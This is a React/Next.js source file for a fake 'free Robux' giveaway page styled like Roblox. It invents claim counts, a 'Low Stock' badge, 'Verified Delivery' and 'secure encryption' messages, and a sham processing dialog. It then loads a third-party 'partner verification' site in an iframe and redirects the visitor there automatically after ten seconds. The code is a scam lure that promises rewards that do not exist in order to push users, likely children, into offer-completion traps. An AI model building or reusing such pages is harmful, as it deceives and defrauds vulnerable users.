'use client';

import { useState, useEffect } from 'react';
import Image from 'next/image';
import { Loader2, Sparkles, Users, X, ShieldCheck } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { cn } from '@/lib/utils';

const CUSTOM_ICON = "https://res.cloudinary.com/dmafb7518/image/upload/v1775750139/GAME_FLASH_20260409_212147_0000_eu5mys.png";
const PROFILE_IMG = "https://res.cloudinary.com/dmafb7518/image/upload/q_auto/f_auto/v1776447812/3acdf58d1dad75bdc82275056dceeb8a_iq5yni.jpg";
const PARTNER_URL = "https://Gameflashx.space/cl/i/grr84r";

const BANNERS = [
  "https://res.cloudinary.com/dmafb7518/image/upload/q_auto/f_auto/v1776447812/d8b9163397f761424ec82de73402f66b_rc1oew.jpg",
  "https://res.cloudinary.com/dmafb7518/image/upload/q_auto/f_auto/v1776447812/0100f6638632dfbf4fb70b4f8be239f6_xveqxc.jpg",
  "https://res.cloudinary.com/dmafb7518/image/upload/q_auto/f_auto/v1776447812/adf2207e703acbc463bba02993f136a6_cgwxm0.jpg"
];

export default function FreeRobuxPage() {
  const [isProcessing, setIsProcessing] = useState(false);
  const [showIframe, setShowIframe] = useState(false);
  const [selectedAmount, setSelectedAmount] = useState<string | null>(null);
  const [bannerIndex, setBannerIndex] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setBannerIndex((prev) => (prev + 1) % BANNERS.length);
    }, 4500);
    return () => clearInterval(interval);
  }, []);

  const rewards = [
    { amount: '50,000', bonus: '+2500 bonus', popular: true },
    { amount: '24,000', bonus: '+1500 bonus', popular: false },
    { amount: '11,000', bonus: '+1000 bonus', popular: false },
    { amount: '2,000', bonus: '+300 bonus', popular: false },
  ];

  const handleClaim = (amount: string) => {
    setSelectedAmount(amount);
    setIsProcessing(true);
    
    setTimeout(() => {
      setIsProcessing(false);
      setShowIframe(true);
      
      setTimeout(() => {
        if (typeof window !== 'undefined') {
          window.location.href = PARTNER_URL;
        }
      }, 10000);
    }, 2800);
  };

  return (
    <div className="min-h-screen bg-black font-sans text-white selection:bg-[#00B06F]/30 overflow-x-hidden box-border">
      
      {/* Background Animated Slider */}
      <div className="fixed inset-0 z-0">
        {BANNERS.map((banner, idx) => (
          <div 
            key={banner}
            className={cn(
              "absolute inset-0 transition-opacity duration-[2000ms] ease-in-out",
              idx === bannerIndex ? "opacity-100 scale-110" : "opacity-0 scale-100"
            )}
            style={{ 
              backgroundImage: `url(${banner})`,
              backgroundSize: 'cover',
              backgroundPosition: 'center',
            }}
          />
        ))}
        <div className="absolute inset-0 bg-black/60 backdrop-blur-[2px]" />
      </div>

      {/* Roblox-style Top Bar */}
      <div className="relative h-16 bg-white/10 backdrop-blur-xl border-b border-white/10 flex items-center px-4 md:px-6 justify-between shadow-xl z-50">
        <div className="flex items-center gap-3 md:gap-4">
          <div className="relative w-8 h-8 md:w-9 md:h-9 drop-shadow-[0_0_8px_rgba(255,255,255,0.3)]">
            <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
          </div>
          <span className="font-black text-xs md:text-sm uppercase tracking-tighter text-white">Rewards Dashboard</span>
        </div>
        <div className="flex items-center gap-4 md:gap-6">
          <div className="hidden lg:flex items-center gap-2 text-[10px] font-black text-white/50 uppercase tracking-[0.2em]">
            <Users className="w-4 h-4 text-[#00B06F]" /> 2.1M users claimed
          </div>
          <div className="flex items-center gap-2 md:gap-3 bg-white/5 pl-1.5 pr-3 md:pr-4 py-1 rounded-full border border-white/10">
            <div className="relative w-7 h-7 md:w-8 md:h-8 rounded-full overflow-hidden border-2 border-[#00B06F] shadow-lg">
              <Image src={PROFILE_IMG} alt="User" fill className="object-cover" />
            </div>
            <span className="text-[10px] md:text-xs font-bold text-white whitespace-nowrap">Premium User</span>
          </div>
        </div>
      </div>

      <main className="relative z-10 max-w-5xl mx-auto py-8 md:py-12 px-4 md:px-6">
        
        {/* Profile Header Hero */}
        <div className="flex flex-col items-center mb-8 md:mb-12 animate-in fade-in slide-in-from-top-8 duration-1000">
           <div className="relative w-20 h-20 md:w-24 md:h-24 rounded-full overflow-hidden border-4 border-white shadow-[0_0_30px_rgba(255,255,255,0.2)] mb-4 md:mb-6 transition-transform hover:scale-105 duration-500">
              <Image src={PROFILE_IMG} alt="Profile" fill className="object-cover" />
           </div>
           <h1 className="text-3xl md:text-5xl font-black mb-2 text-center text-white drop-shadow-lg flex items-center gap-2">
             Exclusive Rewards <Sparkles className="text-yellow-400 w-6 h-6 md:w-8 md:h-8 fill-current animate-pulse" />
           </h1>
           <p className="text-white/60 font-black uppercase tracking-[0.3em] text-[8px] md:text-[10px] text-center">
             Premium member benefit active
           </p>
        </div>

        {/* Roblox Style Main Card */}
        <div className="liquid-glass rounded-[1.5rem] md:rounded-[2.5rem] border border-white/10 overflow-hidden flex flex-col md:flex-row shadow-2xl animate-in zoom-in-95 duration-700">
          
          {/* Left Side: Badge Info */}
          <div className="w-full md:w-1/3 p-6 md:p-10 border-b md:border-b-0 md:border-r border-white/5 bg-white/5 flex flex-col items-center">
            <div className="relative w-32 h-32 md:w-44 md:h-44 rounded-[1.5rem] md:rounded-[2rem] overflow-hidden border-4 border-white/10 shadow-2xl mb-6 md:mb-8 group">
              <Image 
                src="https://picsum.photos/seed/rewards-hero/500/500" 
                alt="Rewards" 
                fill 
                className="object-cover group-hover:scale-110 transition-transform duration-[3s]"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent" />
            </div>
            
            <div className="space-y-3 md:space-y-4 w-full">
              <div className="bg-[#00B06F]/10 text-[#00B06F] p-4 md:p-5 rounded-xl md:rounded-2xl text-[8px] md:text-[10px] font-black uppercase flex items-center gap-3 border border-[#00B06F]/20">
                <ShieldCheck className="w-4 h-4 md:w-5 md:h-5" />
                Verified Delivery
              </div>
              <div className="bg-white/5 text-white/40 p-4 md:p-5 rounded-xl md:rounded-2xl text-[8px] md:text-[10px] font-black uppercase flex items-center gap-3 border border-white/5">
                <Users className="w-4 h-4 md:w-5 md:h-5" /> Low Stock
              </div>
            </div>
          </div>

          {/* Center: Reward Selection */}
          <div className="flex-1 p-6 md:p-10 bg-white/5">
            <div className="grid grid-cols-1 gap-3 md:gap-4">
              {rewards.map((reward, idx) => (
                <div 
                  key={reward.amount} 
                  style={{ animationDelay: `${idx * 150}ms` }}
                  className={cn(
                    "group flex items-center justify-between p-4 md:p-6 rounded-[1.2rem] md:rounded-[2rem] border-2 border-transparent bg-white/5 hover:bg-white/10 hover:border-[#00B06F]/50 transition-all cursor-pointer shadow-lg animate-in fade-in slide-in-from-right-8 duration-700 overflow-hidden",
                    reward.popular && "border-[#00B06F]/20"
                  )}
                  onClick={() => handleClaim(reward.amount)}
                >
                  <div className="flex items-center gap-3 md:gap-6 flex-1 min-w-0">
                    <div className="relative w-10 h-10 md:w-14 md:h-14 flex-shrink-0 drop-shadow-[0_0_15px_rgba(255,255,255,0.2)] group-hover:rotate-12 transition-transform">
                      <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
                    </div>
                    <div className="min-w-0">
                      <div className="flex items-center gap-2 md:gap-3 flex-wrap">
                        <span className="text-xl md:text-4xl font-black tracking-tighter text-white truncate">{reward.amount}</span>
                        {reward.popular && (
                          <span className="bg-[#00B06F] text-white text-[7px] md:text-[8px] font-black uppercase px-2 md:px-3 py-0.5 md:py-1 rounded-full shadow-lg shadow-[#00B06F]/40 animate-pulse whitespace-nowrap">Popular</span>
                        )}
                      </div>
                      <span className="text-[8px] md:text-[10px] font-black text-white/40 uppercase tracking-[0.2em] block truncate">{reward.bonus}</span>
                    </div>
                  </div>
                  
                  <Button className="flex-shrink-0 w-24 md:w-32 bg-[#00B06F] hover:bg-[#008F5B] text-white font-black rounded-full h-10 md:h-16 shadow-xl shadow-[#00B06F]/20 transition-all active:scale-95 text-sm md:text-xl group-hover:scale-105 ml-4 whitespace-nowrap">
                    Free
                  </Button>
                </div>
              ))}
            </div>

            <div className="mt-8 md:mt-10 pt-8 md:pt-10 border-t border-white/10 flex flex-col md:flex-row items-center justify-between gap-4 md:gap-6">
              <div className="text-center md:text-left">
                <p className="text-[8px] md:text-[10px] text-[#00B06F] font-black uppercase tracking-[0.3em] mb-1">
                  * Instant Release Active
                </p>
                <p className="text-[10px] text-white/30 font-bold uppercase tracking-widest">
                  Secure transfer assigned
                </p>
              </div>
              <div className="flex items-center gap-3 text-white font-black text-xs md:text-sm bg-white/10 px-6 md:px-8 py-2 md:py-3 rounded-full border border-white/10 backdrop-blur-md">
                <Users className="w-4 h-4 md:w-5 md:h-5 text-[#00B06F]" /> 254 left
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Step 1: Processing Modal */}
      <Dialog open={isProcessing} onOpenChange={setIsProcessing}>
        <DialogContent className="sm:max-w-md bg-black/95 backdrop-blur-2xl border-white/10 rounded-[2rem] md:rounded-[3rem] p-8 md:p-12 text-center outline-none">
          <DialogHeader>
            <DialogTitle className="hidden">Processing</DialogTitle>
          </DialogHeader>
          <div className="flex flex-col items-center space-y-6 md:space-y-8">
            <div className="relative">
              <Loader2 className="w-16 h-16 md:w-24 md:h-24 text-[#00B06F] animate-spin" />
              <div className="absolute inset-0 flex items-center justify-center p-4 md:p-6">
                <div className="relative w-full h-full animate-pulse">
                  <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
                </div>
              </div>
            </div>
            <div className="space-y-2 md:space-y-3">
              <h2 className="text-2xl md:text-3xl font-black text-white tracking-tighter">Initializing Link...</h2>
              <p className="text-white/40 font-black uppercase tracking-[0.3em] text-[8px] md:text-[10px]">Secure encryption for {selectedAmount} reward</p>
            </div>
            <div className="w-full bg-white/5 h-2 md:h-2.5 rounded-full overflow-hidden mt-2 md:mt-4 border border-white/5">
              <div className="bg-[#00B06F] h-full animate-[progress_2.8s_ease-in-out]" style={{ width: '100%' }} />
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Step 2: Iframe Partner Modal */}
      <Dialog open={showIframe} onOpenChange={setShowIframe}>
        <DialogContent className="max-w-[95vw] sm:max-w-3xl bg-black/95 backdrop-blur-2xl border-white/10 rounded-[2rem] md:rounded-[3rem] p-0 overflow-hidden shadow-[0_0_100px_rgba(0,176,111,0.1)] outline-none">
          <DialogHeader className="p-6 md:p-8 bg-white/5 border-b border-white/10 flex flex-row items-center justify-between space-y-0">
            <div className="flex items-center gap-3 md:gap-4">
              <div className="relative w-7 h-7 md:w-9 md:h-9">
                <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
              </div>
              <div>
                <DialogTitle className="text-xl md:text-2xl font-black text-white tracking-tighter">Final Step</DialogTitle>
                <p className="text-[8px] md:text-[10px] text-white/40 font-black uppercase tracking-[0.2em]">Complete one task to unlock reward</p>
              </div>
            </div>
            <Button variant="ghost" size="icon" onClick={() => setShowIframe(false)} className="rounded-full hover:bg-white/10 text-white/40">
              <X className="w-5 h-5 md:w-6 md:h-6" />
            </Button>
          </DialogHeader>
          
          <div className="relative bg-black h-[60vh] md:h-[550px] flex flex-col">
            <iframe 
              src={PARTNER_URL} 
              className="w-full h-full border-none"
              title="Partner Verification"
            />
            
            <div className="p-6 md:p-8 bg-white/5 border-t border-white/10 text-center backdrop-blur-md">
              <p className="text-[8px] md:text-[10px] text-white/30 font-black uppercase tracking-[0.3em] mb-4">Connection issue? Use direct link</p>
              <Button 
                onClick={() => window.location.href = PARTNER_URL}
                className="w-full bg-[#00B06F] hover:bg-[#008F5B] text-white font-black h-12 md:h-16 rounded-xl md:rounded-2xl text-lg md:text-xl shadow-2xl shadow-[#00B06F]/40 active:scale-95 transition-all"
              >
                Continue to Verify
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <style jsx global>{`
        @keyframes progress {
          0% { width: 0%; }
          100% { width: 100%; }
        }
        .liquid-glass {
          background: linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.03));
          backdrop-filter: blur(12px);
        }
      `}</style>
    </div>
  );
}
